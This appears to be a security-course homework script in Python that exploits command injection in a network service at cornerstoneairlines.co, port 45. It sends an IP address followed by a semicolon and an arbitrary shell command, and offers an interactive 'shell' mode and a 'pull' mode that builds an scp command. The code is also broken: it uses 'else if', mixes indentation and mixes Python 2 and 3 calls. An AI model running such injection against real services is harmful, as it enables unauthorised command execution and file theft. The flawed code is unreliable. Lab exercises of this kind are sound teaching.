"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import sys

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
    command = "142.93.117.193; "+cmd
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)
    print(data)
    s.send(command)
    data = s.recv(1024)
	print(data)


if __name__ == '__main__':
    help_info = "1) shell     Drop into a shell\n2)pull <remote-path> <local-path>     Download files\n3)help     shows this help menu\n4)quit     Quit the shell"
	quit = False
	while not quit:
		user_in = input("command: ")
		if(user_in=="shell"):
			comm_in = input("code: ")
			execute_cmd(comm_in)
		else if(user_in.split(None,1)[0]=="pull"):
			new_in = user_in.split()
			if(len(new_in)!=3):
				print(help_info)
			else:
				comm_in ="scp"+" "+new_in[1]+" "+new_in[2]
				execute_cmd(comm_in)
		else if(user_in=="help"):
			print(help_info)
		else if(user_in=="quit"):
            quit = True
		else:
			print(help_info)

    
